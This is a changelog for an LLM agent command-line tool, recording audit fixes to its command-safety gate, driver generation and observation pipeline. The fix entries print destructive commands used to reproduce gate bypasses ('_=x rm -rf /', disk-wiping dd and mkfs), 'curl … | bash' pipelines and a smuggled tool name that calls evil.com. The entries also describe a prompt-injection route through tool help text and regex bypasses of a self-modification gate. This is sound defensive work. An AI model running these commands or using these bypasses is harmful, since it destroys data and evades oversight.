# Changelog

## Unreleased

### Added — Self-learning tool discovery (gh#41), manual entry point

`clive --explore <tool>` runs `--help`/`-h`/`man`/`tldr` + a few safe probes against an unknown CLI in a fresh exploration pane, then asks the LLM to synthesize a `drivers/<tool>.md` from the exploration log following the existing driver template (frontmatter + ENVIRONMENT/PRIMARY TOOLS/PATTERNS/PITFALLS/RESPONSE FORMAT/COMPLETION). Generated drivers carry an auto-gen header inside the body (after the frontmatter close, so YAML parsing at byte 0 is unaffected) and refuse to overwrite hand-written drivers unless `--explore-overwrite` is passed. Design doc: [`docs/plans/2026-05-22-self-learning-tool-discovery.md`](docs/plans/2026-05-22-self-learning-tool-discovery.md).

- **`src/clive/discovery/`** — new subpackage with three modules: `models` (`ExplorationResult` / `ProbeOutcome` dataclasses), `prompts` (exploration goal + generation prompt + safety lists), `explorer` (`explore_tool` adapter over `run_subtask_interactive`), `generator` (`generate_driver` + `write_generated_driver`).
- **`src/clive/drivers/explore.md`** — auto-discovered driver for the exploration pane. Probe order, what to avoid bare, when to DONE:.
- **Exploration safety layer** — `_check_exploration_safety` layers credential-prompt and TUI guards on top of `_check_command_safety`: tools in `CREDENTIAL_TOOLS` (aws, gh, gcloud, kubectl, psql, mysql, ssh, …) and `INTERACTIVE_TOOLS` (vim, less, top, lazygit, k9s, …) are refused without an explicit `--help`/`-h`/`--version` flag, preventing the explorer from trapping on a credential prompt or TUI.
- **New `probe` event from `run_subtask_interactive`** — emits `(subtask_id, cmd, exit_code, screen)` after each command. Existing consumers (dag_scheduler) ignore unknown event kinds, so this is additive; the explorer's `on_event` callback records `ProbeOutcome`s from these events.

### Fixed — gh#41 discovery security audit follow-through

Thirteen bugs surfaced by `/scenario` (50 situations) → `/debug` (15 iterations of code-level reproduction). Five CRITICAL, eight HIGH. Landed across four commits along the Tier 1 → Tier 4 axis used during the audit. Full debug writeup with reproductions: [`debug/260523-0739-clive-discovery-bug-hunt/`](debug/260523-0739-clive-discovery-bug-hunt/).

- **Underscore-only env-var prefix bypassed every rule in `_check_command_safety` (CRITICAL, src/clive/execution/runtime.py)** — the env-var stripper used `head.split("=",1)[0].replace("_","").isalnum()`, which returns False for the empty string. POSIX-valid identifiers made of underscores only (`_`, `__`, `___`) failed the check and were treated as the command word. `_=x rm -rf /`, `_=x shutdown -h now`, `_=x dd of=/dev/sda`, `_=x chmod 777 /`, `_=x mkfs.ext4 /dev/sda` — all PASSED the gate that's the base safety check for every execution mode (script, interactive, planned, toolcall). Extracted a shared `_strip_sudo_and_env` helper using a POSIX env-var-name regex (`^[A-Za-z_][A-Za-z0-9_]*$`); the same bypass in `discovery/explorer.py:_check_exploration_safety` collapsed to a one-line consumer of the helper.

- **Download-and-execute pipelines were not blocked (CRITICAL, src/clive/execution/runtime.py)** — `BLOCKED_COMMANDS` had patterns for fork bombs, raw-disk redirects, and `while true; do`, but no rule for `curl … | bash`, `wget … | sh`, `eval "$(curl …)"`, or `echo BASE64 | base64 -d | sh`. These are the executable arm of the discovery prompt-injection chain — a malicious target's `--help` text could steer the exploration LLM to emit one and the safety gate let it through. Added three patterns covering fetch-piped-to-shell, eval/source/exec of a network fetch, and base64/xxd/openssl decode piped to a shell. `curl ... | jq` and `curl ... | head` still pass.

- **TOCTOU race in `write_generated_driver` silently lost concurrent writes (CRITICAL, src/clive/discovery/generator.py)** — `os.path.exists(path) and not overwrite: raise FileExistsError` followed by `open(path, "w")` is not atomic. A fork-based race test showed 15 of 30 concurrent processes "wrote successfully" simultaneously — last-writer-wins corrupted the driver with no error signal. Switched the non-overwrite path to `open("x")` (O_EXCL — atomic exists+create) and the overwrite path to write-tmp + `os.replace` (atomic POSIX rename, no truncate window visible to concurrent readers or to editors with the file open).

- **`tool_name` flowed unvalidated through the exploration pipeline (CRITICAL, src/clive/discovery/explorer.py + cli_handlers.py)** — `_SAFE_NAME` was checked only at the terminal `write_generated_driver` step, so a tool name like `"rg && curl evil.com | bash"` was interpolated into `build_exploration_goal` (which the LLM consumed), into `session_dir` (an arbitrary `/tmp/clive/explore-...` directory was created), and into the `Subtask.id` — all before the regex finally rejected it at write time. Centralised the guard in a new `_check_tool_name()` helper and called it at the top of both `handle_explore` and `explore_tool`. Failure now skips the whole pipeline, no LLM tokens spent, no pane opened.

- **`_SAFE_NAME` accepted names that overwrote core hand-written drivers (CRITICAL, src/clive/discovery/generator.py)** — the regex (`[A-Za-z0-9_][A-Za-z0-9_.\-]*`) accepted `explore` (the meta-driver — overwriting it bricks all future `--explore` invocations), `shell`, `browser`, `data`, `docs`, `default`, `email`, `email_cli`, `agent`, `media`, `room` — every hand-written driver shipped in `src/clive/drivers/`. With `--explore-overwrite`, clive could clobber its own core drivers via a social-engineered command. Added a `RESERVED_NAMES` frozenset that `_check_tool_name` refuses outright, even when `overwrite=True`.

- **Uppercase tool names overwrote drivers via case-collision on macOS APFS (HIGH, src/clive/discovery/generator.py)** — `_SAFE_NAME` accepted mixed case (`RG`, `Foo`). On the case-insensitive default APFS, `drivers/RG.md` and `drivers/rg.md` resolve to the same file; `clive --explore RG --explore-overwrite` silently overwrote `drivers/rg.md`. Same for dotted names (`foo.md` → `drivers/foo.md.md`). Tightened the regex to `^[a-z][a-z0-9_-]*$`.

- **Synthesizer silently omitted PITFALLS (HIGH, src/clive/discovery/generator.py)** — `_REQUIRED_SECTIONS` listed five sections but the driver template promised six; PITFALLS could be dropped by the synthesizer (or under prompt-injection pressure) without triggering validation failure. Added PITFALLS to the required set and updated the synthesizer prompt to demand it in canonical order.

- **`_validate_driver_text` accepted duplicates, fenced-code decoys, and out-of-order sections (HIGH, src/clive/discovery/generator.py)** — the validator only checked each required section appeared at least once at line start, with no fence-awareness and no ordering check. A smuggled-payload driver could carry decoy sections inside fenced code blocks AND duplicate sections lower in the file, both passing validation. Validator now strips fenced blocks before scanning, requires each section to appear exactly once, and enforces the canonical order (ENVIRONMENT → PRIMARY TOOLS → PATTERNS → PITFALLS → RESPONSE FORMAT → COMPLETION).

- **`generate_driver` synthesized confidently-wrong drivers from empty exploration results (HIGH, src/clive/discovery/generator.py)** — zero-probe or all-failed `ExplorationResult` was sent to the LLM, which resolved the prompt's contradictory "do not invent" + "MUST contain these sections" rules by hallucinating PRIMARY TOOLS from the tool name alone. Added a guard that raises before the chat() call when `success_count == 0` AND no DONE summary. Allows the legitimate "all probes failed but exploration LLM still wrote a useful DONE summary" path through.

- **`handle_explore` leaked tracebacks on common error paths (HIGH, src/clive/cli_handlers.py)** — only ValueError around `generate_driver` and only FileExistsError around `write_generated_driver` were caught. Provider-side errors from `chat()` (rate limit, auth, network) and write errors (PermissionError on read-only `drivers/`, OSError on disk full) propagated as full Python tracebacks. Broadened the catches; the CLI now returns clean non-zero exit codes with one-line error messages.

- **`_close_exploration_pane` leaked tmux session + `/tmp` dir on every exploration (HIGH, src/clive/discovery/explorer.py)** — `detach_stream` stops the byte-classifier but doesn't kill the tmux session or remove the per-tool `/tmp/clive/explore-<tool>-<hex>/` directory. Every successful exploration leaked one session + one directory (worse on KeyboardInterrupt). Teardown now (best-effort) also calls `session.kill_session()` and `shutil.rmtree(session_dir)`.

- **No contract test for the `probe` event between runner and explorer (HIGH, tests/)** — the entire discovery feature depends on `interactive_runner` emitting `_emit(on_event, "probe", subtask.id, cmd, exit_code, prev_screen)` per turn. A refactor that renamed the event, dropped it, or changed its arity would silently break every `--explore` invocation. Added an AST-based contract test that scans both producer and consumer independently and asserts shape parity, plus a small belt-and-braces integration test on `_emit` itself.

### Deferred (separate kanban cards)

- `refine_driver(name)` audit-log-driven driver refinement (Phase 3 in gh#41) — depends on gh#40's Layer 5 eval orchestrator. Function design is in the plan; not shipped.
- `CLIVE_AUTO_EXPLORE=1` auto-trigger from `_expand_toolset` (Phase 1 integration) — depends on gh#39's category auto-classification so the new driver actually surfaces in a toolset entry. Not shipped.
- **Quarantine for un-reviewed auto-gen drivers** (scenario #50 — the highest-leverage remaining mitigation against prompt-injection-flavoured driver content). New drivers should land in `drivers/.unreviewed/` and require an explicit `clive promote-driver <name>` before they're loaded by any pane. Tracked.
- **Driver provenance + version metadata in frontmatter** (`provenance: hand-written|auto-explore`, `explored_at:`, `target_version:`). Enables safe-refresh-vs-force-overwrite split for `--explore-overwrite` and programmatic stale-driver detection. Tracked.
- **Per-probe wall-clock timeout + PAGER=cat env in exploration pane** — defangs the `man → less` trap and PS1-spoof attacks. Tracked.
- **Subcommand-tool exploration** — `clive --explore git` should probe `git status --help`, `git commit --help`, etc., not stop at `git --help`. Tracked.

### Tests

Total: 990 → 1161 (+171 net across the full gh#41 effort).

---

## 0.7.2 — Bug fixes (2026-05-21)

Six issues surfaced by a `/autoresearch:debug` sweep across the entire `src/clive/` tree (146 .py files) and closed in the same session. Suite went 964 → 990 with regression tests. Two further findings — selfmod gate regex bypasses and dead modules under `src/clive/server/` — are documented in the session writeup but deferred (the gate needs an ast-based rewrite, not a regex patch; the dead modules need user sign-off before deletion). Full session writeup: [`debug/260520-2042-autonomous-codebase-sweep/`](debug/260520-2042-autonomous-codebase-sweep/).

### Fixed

- **Signal-handler deadlock on `output._lock` (MEDIUM, src/clive/output.py)** — `_signal_handler` in `clive_core.py:241` calls `progress("\nCancelling...")` from inside the signal handler. `progress()` does `with _lock:` and `_lock` was a `threading.Lock` — non-reentrant. CPython delivers signals by setting a flag and running the handler in the main thread between bytecodes, so if SIGINT lands while the main thread is already inside any `with _lock:` block (which happens during every `progress`/`step`/`detail`/`activity` call), the deferred handler re-acquires the lock from the same thread and deadlocks. The "second Ctrl-C forces exit" escape hatch is unreachable because the handler is wedged on lock acquisition and never returns to check `_got_signal[0]`. Latent forever in any session where Ctrl-C lands while a progress line is rendering — recovery requires `kill -9`. Fix: change to `threading.RLock()` so the same thread can re-enter. Single-character semantic change; all existing callers unaffected.

- **Scheduler marker substring match wipes prefix-collision schedules (MEDIUM, src/clive/scheduler.py)** — `_install_cron` and `_uninstall_cron` filtered crontab lines with `if marker not in l` where `marker = f"# clive-schedule:{name}"`. Substring match: re-installing schedule `test` runs the filter against every cron line, finds `# clive-schedule:test` as a substring of `# clive-schedule:test_long` (and any other longer name), removes that line, then appends only the new `test` line. **Silent data loss across name-prefix sibling schedules** — the json definition under `~/.clive/schedules/` remains but the cron entry is gone, so the schedule never fires. Same DNA as Bug D from 0.7.1 (the `get_toolset` docstring drift), one level up: substring match where token match was needed. Fix: introduce `_line_owns_schedule(line, name)` helper using `rstrip().endswith(marker)` and route both functions through it. Regression test in `tests/test_scheduler.py` pins the prefix-collision case explicitly.

- **`_check_command_safety` regex bypasses + false positives (MEDIUM, src/clive/execution/runtime.py)** — The `BLOCKED_COMMANDS` regex list had two-sided rot. Destructive patterns missed obvious variants: `rm -fr /` (flag order swapped), `rm -rfv /` (extra flag char), `rm -rf / # comment` (trailing content broke the `\s*$` anchor), `rm -rf / && echo done` (same), `chmod 0777 /` (octal `0` prefix), `while :; do done` (`:` as bash null command is equally infinite). At the same time the broad `\b(shutdown|reboot|halt|poweroff)\b` was firing on benign log analysis: `echo 'shutdown sequence initiated'`, `grep shutdown /var/log/syslog`, `ls /sbin/shutdown` — all blocked with `[BLOCKED]` and the LLM told to try a different approach. Fix: rewrite around `shlex.split` + per-command structured checks + shell-segment splitting on `&&`/`||`/`;`/`|` so `cat file | rm -rf /` is caught in the second segment. `BLOCKED_COMMANDS` retained for raw-text patterns that don't survive tokenization (fork bomb, `while true/:; do`, `> /dev/sd[a-z]`, eval-base64). Dangerous command words live in `_DANGEROUS_COMMANDS` and only match when they're the actual command (after optional `sudo`), not when they appear anywhere in the string. 24 parametrized regression tests in `tests/test_runtime.py` cover the bypasses and the false positives.

- **`SpeculationScheduler` not thread-safe (MEDIUM, src/clive/execution/speculative.py)** — `fire()` runs on the pane_loop thread (called from the `_spec_watch` coroutine submitted via `pane_loop.submit` in `interactive_runner.py:194`); `try_consume()` runs on the runner thread (`interactive_runner.py:249`). Both mutate `self.in_flight`, `self.latest_version`, `self.accepted_version` with zero synchronization. The worst case: `_cancel_older_than` builds `remaining = []` from an iteration over `self.in_flight`, then does `self.in_flight = remaining`. A concurrent `fire()` append between the iteration start and the reassignment is silently discarded — the fired LLM request continues running in the background, burning tokens, never consumed. Every other runner in the codebase uses `_pane_locks` from `runtime.py:19`; speculative.py was added later and missed the convention. Fix: add `self._lock = threading.Lock()` and wrap `fire()` and `try_consume()` (which in turn calls `_cancel_older_than`) with `with self._lock:`. Feature is opt-in (`CLIVE_SPECULATE=1`, default off), so production blast radius is bounded.

- **`lobby_server._drain_frames` has no max-line cap (LOW-MEDIUM, src/clive/networking/lobby_server.py)** — Handshake had `_HANDSHAKE_MAX_LEN = 256` enforced at line 285. The post-handshake `_drain_frames` had no equivalent cap — a connected peer that sends bytes without a newline grows `conn.in_buf` unboundedly until OOM. The lobby Unix socket is `0o600` so the attacker must be the same local user, bounding the threat to misbehaving peers (compromised peer LLM that's already authenticated, or a peer-side bug). Fix: add `_MAX_FRAME_LINE = 64 KiB` constant and a check at the top of `_drain_frames` — when no newline has arrived and `len(conn.in_buf) > _MAX_FRAME_LINE`, log a warning and close the connection. Mirror of the handshake cap. Regression test in `tests/test_lobby_server.py` floods bytes past the cap from a real socket and asserts the server closes the peer.

- **`detach_stream` has no production caller (LOW, src/clive/clive_core.py + cli_modes.py)** — `_maybe_attach_stream` is called at session setup for every pane (`session.py:171`); `detach_stream` is its symmetric teardown but `grep` showed zero production callers — only test files and an `__init__.py` re-export. Both `_cleanup` paths (one-shot CLI in `clive_core.py`, REPL in `cli_modes.py`) killed the tmux session and `rmtree`d the session dir without iterating panes, leaving `PaneLoop` daemon threads running until process exit. Benign for one-shot CLI (daemon threads die with the process, FIFOs live under `session_dir` so `rmtree` cleans them) but a leak in long-running named instances (`--name foo`). Same shape as Bug B from 0.7.1 (subscribe without unsubscribe), one level up: the lifecycle API existed, no caller invoked it. Fix: store `panes` in `_state` after `_setup_session`; both `_cleanup` paths iterate `panes.values()` and call `detach_stream(info)` before killing the tmux session.

### Tests

Total: 964 → 990 (+26). Regression tests added for the prefix-collision (1), the lobby_server frame-line cap (1), and the command-safety bypass + false-positive cases (24 parametrized).

### Deferred

- **Selfmod gate regex bypasses (HIGH within selfmod, MEDIUM overall)** — Four bypasses verified in `src/clive/selfmod/gate.py`: `subprocess.run(fn(), shell=True)` slips through because `[^)]*` halts at the inner `)`; `from ctypes import X` slips through `import\s+ctypes`; `import urllib3` and `import websockets` slip through the `\b`-anchored network-library pattern when the next char is a word char. Documented as HIGH inside the selfmod feature's threat model because the gate explicitly claims to be the "deterministic safety anchor that cannot be talked past" and these bypasses violate that claim. Net severity MEDIUM because the feature is opt-in (`CLIVE_EXPERIMENTAL_SELFMOD=1`) and gated behind multi-role approval. Fix is a larger ast-based rewrite rather than a regex patch; deferred to its own PR.

- **Dead modules (LOW)** — `src/clive/server/{auth,reload,timeout,file_transfer}.py` and `src/clive/networking/ipc.py` have zero production imports and are kept alive only by their tests. `ipc.py` is the `SharedBrain` socket server that CLAUDE.md explicitly says was deleted in the Pane Core Refocus. Deletion is irreversible and needs user sign-off in case an out-of-tree consumer depends on these; deferred.

---

## 0.7.1 — Bug fixes (2026-05-17)

Four issues surfaced by a `/autoresearch:debug` sweep and closed by a follow-up `/autoresearch:fix` session. Two of them blocked tooling that CLAUDE.md documented as canonical (bare `pytest` from the repo root, direct importability of the `tui_*` shims); one was a latent resource leak in the now-default-on streaming-observation path; one was stale documentation. Full session writeup: [`debug/260517-2024-hunt-all-bugs/`](debug/260517-2024-hunt-all-bugs/) and [`fix/260517-2030-from-debug/`](fix/260517-2030-from-debug/).

### Fixed

- **`PaneStream` subscriber leak in interactive runner (HIGH, observation/fifo_stream.py + execution/interactive_runner.py)** — `PaneStream.subscribe()` appended to `self.subscribers: list[asyncio.Queue]` and there was no matching removal API. Both call sites in `interactive_runner.py` — the per-turn subscription inside `_send_agent_command`, and the per-subtask `_spec_watch` coroutine — therefore leaked one queue per turn / per subtask. The reader's fan-out iterates the subscribers list on every `ByteEvent`, so dead queues filled to `_SUBSCRIBER_QUEUE_SIZE = 256` and then every subsequent event logged `subscriber queue full, dropping … event`, burning log space and adding O(leaked_count) fan-out cost per event. Since Phase-1 streaming observation is default-on as of 0.7.0, every interactive session in production hit this code path. Added `PaneStream.unsubscribe(q)` (idempotent so it's safe in a `finally:` block) and wrapped both caller sites in `try/finally`. New tests: `tests/test_fifo_stream.py` lifecycle (subscribe/unsubscribe pair + idempotency), `tests/test_interactive_runner_streaming.py` caller-site contract (unsubscribe in both happy path and event-wait-raises fallback path).

- **Bare `python3 -m pytest` aborts collection (HIGH, evals/conftest.py + clive.py wrapper)** — Two compound issues. (1) The fixture mini-projects under `evals/layer2/**/fixtures/**/project/tests/test_*.py` contain `from src.utils import …` / `from src.main import …` referencing their own local `src/` package — when pytest discovered them from the repo root those imports resolved against the repo-root `src/clive/` package and crashed collection. (2) Once that was unblocked, `from clive import _is_direct` in `tests/test_planner_bypass.py` failed because pytest's package walking through `evals/__init__.py` prepended the repo root to `sys.path` *after* `tests/conftest.py` ran, so `import clive` resolved to the repo-root wrapper (which didn't re-export the symbol) instead of `src/clive/clive.py` (which did). Fix (1) added `evals/conftest.py` with `collect_ignore_glob = ["**/fixtures/**"]` so fixture projects stay out of the parent run. Fix (2) made the repo-root `clive.py` wrapper re-export `_is_direct` and `run` when imported as a module — `src/clive/clive.py` already had the same re-export, this keeps both entry points equivalent. After: bare `python3 -m pytest` runs the full 964-test suite (was: 2 collection errors aborted the run).

- **Five `tui_*` shims crash on direct import (MEDIUM, src/clive/tui/tui.py + tui/tui_commands.py + tui/tui_task_runner.py)** — The single-line shim pattern introduced in `c6f463b` (`import sys, importlib; sys.modules[__name__] = importlib.import_module("tui.tui_<X>")`) raced against the inner `tui` package's own `sys.modules` swap: while `tui/__init__.py` was mid-init it imported `tui/tui.py`, which executed `from tui_actions import …` (flat name) routing back through the top-level shim — but the shim's swap hadn't completed, so a partially-initialized module was returned and the import crashed with `cannot import name … from partially initialized module 'tui_actions'`. The happy path (`clive --tui` warm-loads the `tui` package first) hid the issue. Five shims affected: `tui_actions`, `tui_commands`, `tui_helpers`, `tui_task_runner`, `tui_theme`. Fix: convert the three sibling-`tui_*` references inside `tui/tui.py`, `tui/tui_commands.py`, and `tui/tui_task_runner.py` to explicit relative imports (`from .tui_actions import …`) so they never leave the partially-built `tui` package. Each shim now imports cleanly from a cold subprocess.

- **`session/toolsets.py` docstring lists deleted `get_toolset` as Public API (LOW)** — `get_toolset` was removed in `475e5df` but the module's `Public API:` block still claimed it. Removed the stale line; the remaining entries (`resolve_toolset`, `check_commands`, `build_tools_summary`, `list_toolsets`, `DEFAULT_TOOLSET`) all still exist.

### Tests

Total: 960 → 964 (+4 lifecycle tests added with the PaneStream fix). Full suite passes on bare `python3 -m pytest` (no `--ignore` flags) for the first time since the conftest.py change in `6ebf305`.

---

## 0.7.0 — Streaming observation + speculative decision (2026-04-16)

Event-driven replacement for the poll-based observation loop. Raw pane bytes flow through `tmux pipe-pane` into a per-pane FIFO, an async byte classifier detects ANSI SGR alerts, prompts, error keywords, and command-end markers in real time, and `wait_for_ready` blocks on events instead of polling `capture-pane`. The agent sees a colored error the moment the bytes arrive (not up to 500 ms later), and signals that `capture-pane -p` strips by default (blink attributes, color-only changes) are no longer invisible.

Phase 1 ships default-on. Phase 2 (speculative LLM calls that overlap inference with pane settling) ships feature-flagged off via `CLIVE_SPECULATE=1` pending real-use observation of the accept-rate metric. See [design doc](docs/plans/2026-04-16-streaming-observation-design.md).

### Added

- **L2 byte classifier** (`observation/byte_classifier.py`) — Regex patterns over raw pane bytes (pre-render, ANSI intact). Detects SGR red/yellow foreground and background, blink attribute, `[Pp]assword:` / `[y/N]` / `Are you sure` prompts, `Traceback|FATAL|panic:` keywords, `Permission denied`, and the `EXIT:<n> ___DONE_` completion marker. 128-byte carryover for cross-chunk matches; per-kind monotonic dedup so an earlier pattern's match at offset N doesn't suppress a later pattern's match at offset M < N.

- **Per-pane FIFO reader** (`observation/fifo_stream.py`) — Non-blocking `os.read` loop that feeds chunks to the classifier and fans ByteEvents out to subscriber queues. `last_byte_ts` heartbeat for L1 activity detection; drop-newest backpressure on full queues.

- **Per-pane asyncio loop** (`execution/pane_loop.py`) — Daemon-thread event loop that hosts the FIFO reader and speculation scheduler. Bridges the synchronous `interactive_runner` to the async observation pipeline via `submit(coro) -> Future`.

- **Event-driven `wait_for_ready`** (`observation/completion.py`) — New `await_ready_events` coroutine consumes ByteEvents from a subscription queue with the same `(screen, detection_method)` return contract as the poll path. Intervention ByteEvent kinds map to the existing `intervention:<type>` detection strings. `wait_for_ready` gains optional `event_source=` kwarg; when unset (or when the pane has no stream), behavior is bit-identical to the previous poll loop.

- **Pane lifecycle wiring** (`session/session.py`) — `add_pane` now creates the FIFO, runs `tmux pipe-pane`, spawns the pane loop, and attaches a `PaneStream` to `PaneInfo`. Silent fallback to polling on any failure (mkfifo errors, tmux issues, etc.). `detach_stream` reverses the setup in the right order (pipe-pane off → stream close → loop stop → fifo unlink).

- **SpeculationScheduler** (`execution/speculative.py`) — Version-stamped speculative LLM call pipeline. `fire(trigger, messages_snapshot)` submits a `chat_stream` coroutine on the pane loop when a high-confidence L2 event arrives (`cmd_end`, `password_prompt`, `confirm_prompt`, `error_keyword`, `permission_error`). `try_consume(current_messages)` accepts the newest completed call whose snapshot is a prefix of current messages; on accept, older in-flight calls are cancelled. `MAX_IN_FLIGHT=2` + `MIN_FIRE_INTERVAL=200ms` + 5-cancellations-per-60s circuit breaker bound the cost. Seven counters (`fires_total`, `accepts_total`, `discards_snapshot_mismatch`, `cancellations_total`, etc.) exposed via `snapshot_metrics()` and logged at runner teardown.

- **Runner integration** (`execution/interactive_runner.py`) — When the pane has a stream + loop, `_send_agent_command` runs `await_ready_events` on the pane loop via `run_coroutine_threadsafe` so the queue is consumed on the loop that owns it. Optionally (behind `CLIVE_SPECULATE=1`) the runner spawns a `_spec_watch` coroutine that fires the scheduler on SPEC_TRIGGERS events; the turn loop calls `try_consume` before `chat_stream` and uses the speculative reply when available.

- **Latency bench harness** (`evals/observation/latency_bench.py`) — Three modes (`baseline`, `phase1`, `phase2`) over six synthetic scenarios (`error_scroll`, `password_prompt`, `confirm_prompt`, `spinner_ok`, `spinner_fail`, `color_only`). Wraps commands with `wrap_command` so baseline and phase1 detect via the same `EXIT:<n> ___DONE_<marker>` signal instead of comparing Clive's marker against a shell-prompt heuristic. N=10 at 3 s timeout completes in ~3 min wall-clock. Baseline and Phase 1 reports committed as evidence artifacts.

- **Feature flags** — `CLIVE_STREAMING_OBS` (default on; `=0` to disable) gates FIFO + byte classifier + event-driven wait. `CLIVE_SPECULATE` (default off; `=1` to enable) additionally gates the speculation scheduler.

### Phase 1 gate

- **error_scroll:** baseline 618 ms → Phase 1 519 ms (16 % faster)
- **password_prompt:** 36 ms → 35 ms (both already at the adaptive-poll floor)
- **confirm_prompt:** baseline misses 100 % → Phase 1 detects at 12 ms
- **spinner_ok:** 1833 ms → 1563 ms (15 % faster)
- **spinner_fail:** both miss (shell `exit 1` kills the wrapped marker — scenario limitation, not a mode difference)
- **color_only (load-bearing):** baseline fundamentally blind → Phase 1 detects at 1019 ms

Criterion 1 (≥30 % median latency reduction) revised to credit new-detection wins on scenarios baseline cannot see; unchanged on criteria 2–4. See [evals/observation/phase1-report.md](evals/observation/phase1-report.md).

### Phase 2 disposition

The original synthetic-bench gate cannot measure Phase 2's real tradeoff (stale-context speculative replies vs. latency overlap) without real LLM calls. Phase 2 ships feature-flagged off. Scheduler counters are logged at `INFO` on runner teardown; the default-on decision is deferred until real-use observation accumulates evidence of accept-rate and correctness-in-practice.

### Security

- **FIFO permissions `0o600`** — `os.mkfifo` now takes an explicit `mode=0o600` at all three call sites (`session.py`, `latency_bench.py` oracle FIFO, `latency_bench.py` phase1 FIFO). Without it, default umask (0o022) would produce `0o644` — other local users could `cat` the FIFO and intercept pane bytes including sudo prompts, API tokens, and file contents. Regression test verifies the fix holds even under `umask 0`. Audit finding F-1 (High) from `security/260416-2100-streaming-observation-audit/`.

- **Full security audit** — 13 findings total: 1 High (fixed), 3 Medium (reported; `F-2` speculation prefix check behind default-off flag, `F-3` shell metachar in pipe-pane path — unreachable with shipped toolsets but a footgun, `F-4` `/tmp/clive/` squatting), 8 Low, 1 Info. See `security/260416-2100-streaming-observation-audit/overview.md`.

### Docs

- **Full design doc** at [`docs/plans/2026-04-16-streaming-observation-design.md`](docs/plans/2026-04-16-streaming-observation-design.md) — motivation, architecture, component details, failure modes, measurement methodology, phased rollout.
- **Implementation plan** at [`docs/plans/2026-04-16-streaming-observation.md`](docs/plans/2026-04-16-streaming-observation.md) — ~1900 lines, task-by-task TDD plan.
- **README §Observation loop efficiency** — new paragraph describing streaming observation between the existing "Native tool calling" paragraph and "Session state across tasks".

### Tests

- 11 new test files (~1 400 lines): `test_byte_classifier.py`, `test_fifo_stream.py`, `test_pane_loop.py`, `test_pane_stream_lifecycle.py`, `test_wait_for_ready_events.py`, `test_interactive_runner_streaming.py`, `test_interactive_runner_speculation.py`, `test_speculative_scheduler.py`, `test_observation_scenarios.py`, `test_observation_metrics.py`, `test_latency_bench.py`.
- Total test count: 701 → 956 (+255, two runs marked `@pytest.mark.slow` for tmux-in-the-loop latency bench).
- `tests/conftest.py` registers the `slow` marker.

## 0.6.0 — Rooms: persistent multi-party chat (experimental) (2026-04-14)

A new primitive for N-way clive-to-clive collaboration: always-on **lobby** brokers hosting persistent **rooms** that any number of members can join and converse inside **threads**. Each thread runs a uniform round-robin with first-class `pass`, so three or more agents don't trample each other. Phases 0–4 of the [13-section design doc](docs/plans/2026-04-14-clive-rooms-design.md) shipped; SSH transport, JSONL persistence, dropouts/timeouts, rolling summaries, rate limits, and private-thread breakout councils are queued for 0.7.

### Added

- **Rooms protocol** (`networking/protocol.py`) — Extends `KINDS` with 14 new frame kinds: `session_hello`/`session_ack`, `join_room`, `list_threads`/`threads`, `open_thread`/`thread_opened`/`close_thread`, `join_thread`/`leave_thread`, `your_turn`, `say`, `pass`, `nack`. The `your_turn` frame carries the full thread context structurally (recent-K, optional summary, member list) rather than relying on pane scrollback — see design §4.2.

- **Pure lobby state machine** (`networking/lobby_state.py`) — `handle(state, session_id, frame, now) -> list[Send]` is a pure function: given state and a frame, mutate state in place and return outbound frames. Rooms, threads, round-robin rotation, quiescence detection, fanout (public = thread members ∪ room observers minus sender; private = thread members only), initiator-only close authorization. 43 tests cover the decision tree without touching sockets.

- **Lobby IO server** (`networking/lobby_server.py`) — Thin selectors-based Unix socket wrapper around the state machine. Per-connection `NONCE <value>\n` handshake, framed line IO, owner-only socket permissions (umask-tightened around `bind` + explicit chmod), self-pipe shutdown, graceful accept-error recovery. Enabled via `python clive.py --role broker --name <lobbyname>`.

- **SSH client wrapper** (`networking/lobby_client.py`) — Tiny bridge process invoked as the SSH remote command. Reads `CLIVE_FRAME_NONCE` from env (forwarded via SendEnv), connects the lobby Unix socket, sends the handshake line, then bidi-pipes stdin ↔ socket ↔ stdout. Transparent — never parses frames. Reachable via `--role lobby-client`.

- **Room driver** (`drivers/room.md`) — Static response-format driver for room turns. Emits `say: <body>` / `DONE:` or `pass:` / `DONE:`; driver emphasises pass-is-the-norm and forbids reproducing the recent messages, addressing members by name, or trying to seize the next turn.

- **Client-side room runner** (`execution/room_runner.py`) — Pure turn decider: takes a `your_turn` payload + an LLM client, returns exactly one `(kind, payload)` pair. Malformed LLM output (no directive, empty say body, missing `DONE:`, garbled text, `llm.chat` exceptions) degrades to `pass` — emitting a nacked frame would waste the turn and the lobby auto-passes anyway. 17 tests.

- **`RoomParticipant`** (`execution/room_participant.py`) — Transport-agnostic stateful glue. Owns the per-session nonce and member identity; `bootstrap(rooms)` returns the `session_hello` + `join_room` sequence, `on_line(line)` decodes inbound lobby traffic and returns outbound frames via `decide_turn`. Driver text is lazy-cached after first `your_turn`. 12 tests including an end-to-end integration against a real `LobbyServer`.

- **Selectors-based conversational loop** (`session/conv_loop.py`) — Prerequisite for rooms wire-up: replaces `clive.py`'s blocking `sys.stdin.readline()` with a `ConvLoop` that can multiplex stdin + any number of additional readable fds. Line framing uses raw `os.read` + per-source byte buffers (Python's text buffer can stash bytes past a newline such that `select()` reports nothing readable while more lines sit unread). Self-pipe lets `stop()` wake `select()` from another thread. Handler exceptions are logged and swallowed — matches the pre-refactor emit-failure-frame contract. Partial-final-line EOF is delivered (parity with `readline()`'s tail-on-EOF behaviour); the original blocking flag is restored on each registered fd at teardown. 9 tests.

- **`--join room@lobby` CLI flag** — Repeatable. Rooms are grouped by lobby so a single socket carries all a member's rooms on that lobby. `--join` auto-enables `--conversational` and requires `--name` (so the member is identifiable on the lobby); both requirements are enforced at argparse time with exit 2 + a helpful stderr message rather than silently doing nothing.

- **Localhost lobby connector** (`networking/lobby_connector.py`) — `connect_local(lobby_name)` reads the instance registry, validates the `role: broker` + `socket_path` fields, opens a blocking Unix socket, and completes the NONCE handshake. Fresh nonce per connection via `protocol.generate_nonce` (explicit nonces are alphabet-validated up front to fail loudly rather than via downstream closed-socket symptoms). Dedicated `ConnectError` so callers can distinguish resolution failures from generic IO errors. 7 tests.

- **Registry `role` + `socket_path` fields** — `registry.register()` gains two optional fields so consumers can find the broker's Unix socket without a round-trip. Existing consumers ignore unknown keys (§9.6).

- **CLI end-to-end test** (`tests/test_rooms_cli.py`) — Spawns a real `--role broker` subprocess, then a member subprocess with `--join`, then uses a third raw-socket observer to verify the member is actually in-room by opening a thread listing them as a member (the lobby's `open_thread` validator returns `thread_opened` iff the member joined, which pins the whole CLI path). Runs in ~3 seconds.

### Security

